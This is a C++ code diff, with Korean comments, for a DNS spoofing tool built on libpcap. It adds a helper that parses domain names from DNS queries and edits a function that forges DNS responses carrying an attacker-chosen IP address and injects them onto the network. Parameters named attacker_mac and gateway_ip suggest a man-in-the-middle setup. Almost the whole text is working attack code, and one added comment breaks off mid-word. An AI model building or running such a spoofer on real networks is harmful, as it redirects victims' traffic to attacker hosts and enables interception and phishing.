@@ -6,6 +6,23 @@
 #include <iostream>
 #include <arpa/inet.h>
 
+using namespace std;
+
+std::string extract_domain_name(const uint8_t* dns_data, size_t dns_len) {
+    std::string domain;
+    size_t pos = 12; // DNS 헤더는 12바이트
+    while (pos < dns_len) {
+        uint8_t len = dns_data[pos];
+        if (len == 0) break;
+        if (!domain.empty()) domain.push_back('.');
+        pos++;
+        for (int i = 0; i < len && pos < dns_len; i++, pos++) {
+            domain.push_back(dns_data[pos]);
+        }
+    }
+    return domain;
+}
+
 void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_packet_len,
                              const u_int8_t* attacker_mac, const u_int8_t* gateway_ip) {
     const int eth_len = 14;
@@ -21,7 +38,7 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
     while(qname_len < (int)(orig_packet_len - (eth_len + dns_header_len)) && query_ptr[qname_len] != 0)
         qname_len++;
     qname_len++; // null byte 포함
-    int question_extra = 4;
+    int question_extra = 4; // QTYPE(2) + QCLASS(
     int question_len = dns_header_len + qname_len + question_extra;
     const int answer_len = 16;
     int new_dns_payload_len = question_len + answer_len;
@@ -64,6 +81,7 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
     
     // DNS 헤더: 응답 플래그 및 응답 레코드 수 수정
     struct dns_header* dns_resp = (struct dns_header*)(spoof_packet + eth_len + ip_header_len + udp_header_len);
+    
     memcpy(dns_resp, dns, dns_header_len);
     dns_resp->flags = htons(0x8180);
     dns_resp->ancount = htons(1);
@@ -89,9 +107,9 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
     memcpy(answer_ptr + 12, spoof_ip, 4);
     
     if (pcap_sendpacket(handle, spoof_packet, new_packet_len) != 0)
-        std::cerr << "Failed to send spoof DNS response: " << pcap_geterr(handle) << std::endl;
+        cerr << "Failed to send spoof DNS response: " << pcap_geterr(handle) << endl;
     else
-        std::cout << "Spoof DNS response sent successfully.\n";
+        cout << "Spoof DNS response sent successfully.\n";
     
     delete[] spoof_packet;
 }
